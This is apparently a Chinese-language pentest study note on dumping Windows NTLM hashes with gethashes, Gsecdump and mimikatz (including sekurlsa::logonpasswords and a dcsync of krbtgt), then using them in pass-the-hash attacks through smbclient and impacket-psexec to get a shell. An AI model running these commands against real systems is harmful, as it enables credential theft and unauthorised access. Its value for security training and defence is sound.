# 提取 NTML hash

## SAM 文件位置
Window 中加密后的 hash 密码存储在 SAM 文件中
windowNT 4.0 sp 3 后 SAM 文件被加密，密码分为两种 LM 和 NTLM，但是由于加密过于薄弱，在 window vista 和 window server 2008 后被默认不启用
2012 server 版本以及之前的版本，可以从内存中读取管理员明文密码，2012 以后需要修改注册表后再可以读取内存
SAM 文件在 c:\Windows\system 32\config\sam



## gethashes 提取NTLM hash
需要管理员权限方可执行读取 hash 操作
`gethashes.exe  $local`


## Gsecdump获取NTLM hash
功能强大，但是已被杀毒软件认为是病毒
`Gsecdump`
-h  显示帮助，-a  获取所有密码信息，-s 从 sam 文件和域控中获取 hash 值，-u 获取当前登录用户的 hash，-w  获取无线密码

  
## 使用 mimikatz 提取 NTML hash
  Mimikatz 原理：
  使用 sekurlsa 模块读取 LSASS 进程的内存，获取用户 hash
  LSASS（Local Security Authority Subsystem）管理用户 hash 以及认证信息
  使用条件：
  开启 SeDebugPrivilege，这个设置可以使我们 debug 不属于我们的进程
  `mimikatz# privilege::debug`      开启SeDebugPrivilege权限
  `mimikatz# token::elevate`    获取system权限token
  `mimikatz# lsadump::sam`    读取SAM中的用户凭证
  `mimikatz# sekurlsa::logonpasswords `     获取当前在线用户的明文密码（需要高权限运行）
  `mimikatz# lsadump::lsa /patch`     获取当前此计算机存在过用户的NTLMHASH
  `mimikatz# lsadump::sam SYSTEM.hiv`    导出所有用户口令 使用Volue Shadow Copy获得SYSTEM、SAM备份
  `mimikatz# sekurlsa::minidump lsass.dmp`   通过内存文件获取口令
  `mimikatz# sekurlsa::logonPasswords full`
  `mimikatz# lsadump::dcsync /domain:rd.adsecurity.org /user:krbtgt`    拉取 rd.adsecurity.org 域中的 KRBTGT 用户帐户的密码数据
  `mimikatz# lsadump::dcsync /domain:lab.adsecurity.org /user:adsdc03$`    拉取 lab.adsecurity.org 域中 ADSDC03 域控制器的计算机帐户的密码数据

 
  
# Pass-the-hash PtH
有些时候破解 hash 时间过于长，所以选择 pass the hash 方法，即登录使用 NTML hash，不使用帐号密码
此外，如果我们在一个目标上发现一个 hash，我们不仅可以使用它来对该目标进行身份验证，还可以对另一个目标进行身份验证，只要第二个目标具有具有相同用户名和密码的帐户。
自 WindowsVista 以来，所有 Windows 版本都默认启用了 UAC 远程限制 1。这会阻止软件或命令在远程系统上使用管理权限运行。


## 使用 NTMLhash 登录远程 smb 服务
`smbclient //192.168.2.200/secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b`


  
## 使用 impacket-psexec工具返回一个[[ReverseShell|反弹 shell]]
`impacket-psexec -hashs 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.2.200`
Psexec 会使用 NTML hash 登录目标文件共享，并且写入 shell，通过设置 windows 服务执行 shell，获得[[ReverseShell|反弹 shell]] 
获取 system 32 权限
或者使用 wpexec 获取目标 administrator 权限

  



https://www.freebuf.com/articles/network/190128.html

https://www.icekam.com/post/wfuzz-web-blasting-and-exhaustive-tools/